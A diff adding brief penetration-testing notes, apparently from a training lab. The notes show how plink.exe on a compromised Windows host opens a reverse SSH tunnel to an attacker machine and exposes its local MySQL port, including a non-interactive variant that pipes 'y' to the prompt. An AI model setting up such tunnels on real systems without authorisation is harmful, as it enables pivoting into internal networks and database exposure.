@@ -1,0 +1,11 @@
+=================================================
+plink.exe : windows based command line ssh client
+=================================================
+attacker --> victim:1234 --> target:3306(mysql)
+	basic
+	plink.exe -ssh -l <attacker username> -pw <password> -R <bind_address>:<port>:<host>:<hostport> <target ip>
+	plink.exe -ssh -l xanthorrhizol -pw hello -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
+
+	gain interactivity level --> pipe answer to the prompt
+		cmd.exe /c echo y | plink.exe -ssh -l <attacker username> -pw <password> -R <bind_address>:<port>:<host>:<hostport> <target ip>
+		cmd.exe /c echo y | plink.exe -ssh -l <attacker username> -pw <password> -R <bind_address>:<port>:<host>:<hostport> <target ip>
